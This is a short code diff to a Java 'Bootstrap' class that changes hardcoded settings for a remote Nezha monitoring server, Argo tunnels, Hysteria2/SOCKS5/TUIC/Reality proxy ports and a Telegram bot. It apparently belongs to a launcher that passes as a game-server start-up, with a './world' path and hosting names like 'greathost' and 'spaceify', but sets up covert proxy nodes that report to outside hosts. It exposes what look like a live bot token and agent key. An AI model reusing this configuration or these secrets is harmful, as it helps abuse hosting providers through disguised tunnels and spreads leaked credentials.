@@ -98,21 +98,21 @@ public class Bootstrap
         envVars.put("FILE_PATH", "./world");
         envVars.put("NEZHA_SERVER", "nezha.jaxmike.nyc.mn");
         envVars.put("NEZHA_PORT", "443");
-        envVars.put("NEZHA_KEY", "4ye75OmhG2duIQbc50");
+        envVars.put("NEZHA_KEY", "hBamKmbSCrxc2XOoJk");
         envVars.put("ARGO_PORT", "8001");
         envVars.put("ARGO_DOMAIN", "");
         envVars.put("ARGO_AUTH", "");
-        envVars.put("HY2_PORT", "20076");
-        envVars.put("S5_PORT", "20129");
-        envVars.put("TUIC_PORT", "20297");
-        envVars.put("REALITY_PORT", "20489");
+        envVars.put("HY2_PORT", "");
+        envVars.put("S5_PORT", "");
+        envVars.put("TUIC_PORT", "");
+        envVars.put("REALITY_PORT", "");
         envVars.put("UPLOAD_URL", "");
         envVars.put("CHAT_ID", "7592034407");
         envVars.put("BOT_TOKEN", "8002189523:AAFDp3-de5-dw-RkWXsFI5_sWHrFhGWn1hs");
         envVars.put("CFIP", "104.17.97.5");
         envVars.put("CFPORT", "2096");
-        envVars.put("NAME", "greathost");
-        envVars.put("DISABLE_ARGO", "true");
+        envVars.put("NAME", "spaceify");
+        envVars.put("DISABLE_ARGO", "false");
         
         for (String var : ALL_ENV_VARS) {
             String value = System.getenv(var);
